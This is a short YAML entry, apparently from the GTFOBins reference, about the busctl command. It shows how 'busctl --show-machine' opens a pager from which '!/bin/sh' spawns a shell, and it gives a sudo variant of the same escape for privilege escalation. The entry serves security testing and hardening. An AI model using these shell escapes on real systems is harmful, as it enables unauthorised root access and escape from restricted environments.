---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  shell:
    - code: |
        busctl --show-machine
        !/bin/sh
  sudo:
    - code: |
        sudo busctl --show-machine
        !/bin/sh
---
